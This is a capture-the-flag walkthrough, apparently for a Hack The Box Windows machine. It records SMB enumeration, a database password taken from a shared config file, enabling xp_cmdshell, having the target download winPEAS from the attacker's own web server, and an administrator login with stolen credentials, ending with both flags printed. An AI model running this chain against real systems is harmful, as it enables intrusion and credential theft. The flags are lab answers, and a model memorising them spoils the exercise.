┌──(kali㉿kali)-[~/htb]
└─$ nmap -sV 10.129.*.* -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-09 12:34 EDT
Warning: 10.129.*.* giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.*.*
Host is up (0.064s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
135/tcp   open     msrpc          Microsoft Windows RPC
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1163/tcp  filtered sddp
1433/tcp  open     ms-sql-s       Microsoft SQL Server 2017 14.00.1000
2875/tcp  filtered dxmessagebase2
4998/tcp  filtered maybe-veritas
5911/tcp  filtered cpdlc
5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
10009/tcp filtered swdtp-sv
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds

Since there is a 445 port opened, lets check the smb server:

┌──(kali㉿kali)-[~/htb]
└─$ smbclient -L //10.129.*.*/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.*.* failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

So the Admin, C and IPC is not available, only for admins...lets check the backups:
┌──(kali㉿kali)-[~/htb]
└─$ smbclient //10.129.*.*/backups -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

Hm. Lets see what is in the file...

┌──(kali㉿kali)-[~/htb]
└─$ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>                                                                                                                                                           

Okay...we have an ID: ARCHETYPE\sql_svc and a pw: M3g4c0rp123...Lets use it:
The tab says we should use mssqlclient.py script. But i don't have this script on my kali, so another way to do it:
┌──(kali㉿kali)-[~/htb]
└─$ impacket-mssqlclient ARCHETYPE/sql_svc@10.129.*.* -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 

so we got a SQL promt...our first job is enable xp_cmdshell:
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
output              
-----------------   
archetype\sql_svc   
NULL                

Next move is get the winpeas on the target pc...
we have a link:https://github.com/peass-ng/PEASS-ng/releases and download the winpeas.bat file.
NOW Start to run our own host server: 
┌──(kali㉿kali)-[~/htb]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

After this on the tartgets pc:
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c iwr -uri http://MY_IP/winPEAS.bat -OutFile C:\Users\sql_svc\AppData\Local\Temp\winPEAS.bat"
output   
------   
NULL     
SQL (ARCHETYPE\sql_svc  dbo@master)> 
If the file transfer was successful...on our host panel we should see this:
┌──(kali㉿kali)-[~/htb]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.*.* - - [09/Mar/2026 13:12:13] "GET /winPEAS.bat HTTP/1.1" 200 -

Next move is running the bat file:
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "C:\Users\sql_svc\AppData\Local\Temp\winPEAS.bat > C:\Users\sql_svc\AppData\Local\Temp\out.txt"
//this will take a while//
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "C:\Users\sql_svc\AppData\Local\Temp\winPEAS.bat > C:\Users\sql_svc\AppData\Local\Temp\out.txt"
output                             
--------------------------------   
                            
   cription = Invalid namespace
No User exists for *               
NULL                               

Everything is fine...as in the tab, there is a question which indicates us what we shouls check next...
The question is:
"What file contains the administrator's password?"
And the right answer is consolehost_history.txt.
So check it:
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
output                                                                    
-----------------------------------------------------------------------   
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!   
exit                                                                      
NULL                                                                      
SQL (ARCHETYPE\sql_svc  dbo@master)> 

So we have a username and a password...Exit from SQL, and use evin-winrm again with the new credentials:
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.*.* -u administrator -p 'MEGACORP_4dm1n!!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

And move again:
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd..
*Evil-WinRM* PS C:\Users\Administrator> cd..
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/19/2020  10:39 PM                Administrator
d-r---        1/19/2020  10:39 PM                Public
d-----        1/20/2020   5:01 AM                sql_svc


*Evil-WinRM* PS C:\Users> cd sql_svc
*Evil-WinRM* PS C:\Users\sql_svc> ls


    Directory: C:\Users\sql_svc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        1/20/2020   5:01 AM                3D Objects
d-r---        1/20/2020   5:01 AM                Contacts
d-r---        1/20/2020   5:42 AM                Desktop
d-r---        1/20/2020   5:01 AM                Documents
d-r---        1/20/2020   5:01 AM                Downloads
d-r---        1/20/2020   5:01 AM                Favorites
d-r---        1/20/2020   5:01 AM                Links
d-r---        1/20/2020   5:01 AM                Music
d-r---        1/20/2020   5:01 AM                Pictures
d-r---        1/20/2020   5:01 AM                Saved Games
d-r---        1/20/2020   5:01 AM                Searches
d-r---        1/20/2020   5:01 AM                Videos


*Evil-WinRM* PS C:\Users\sql_svc> cd Desktop
*Evil-WinRM* PS C:\Users\sql_svc\Desktop> ls


    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:37 AM             32 user.txt


*Evil-WinRM* PS C:\Users\sql_svc\Desktop> cat user.txt
3e7b102e78218e935bf3f4951fec21a3
*Evil-WinRM* PS C:\Users\sql_svc\Desktop> 
Here is the first flag.
And the other one:
*Evil-WinRM* PS C:\Users\sql_svc\Desktop> cd c:\Users\Administrator
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        7/27/2021   2:30 AM                3D Objects
d-r---        7/27/2021   2:30 AM                Contacts
d-r---        7/27/2021   2:30 AM                Desktop
d-r---        7/27/2021   2:30 AM                Documents
d-r---        7/27/2021   2:30 AM                Downloads
d-r---        7/27/2021   2:30 AM                Favorites
d-r---        7/27/2021   2:30 AM                Links
d-r---        7/27/2021   2:30 AM                Music
d-r---        7/27/2021   2:30 AM                Pictures
d-r---        7/27/2021   2:30 AM                Saved Games
d-r---        7/27/2021   2:30 AM                Searches
d-r---        7/27/2021   2:30 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:36 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
b91ccec3305e98240082d4474b848528

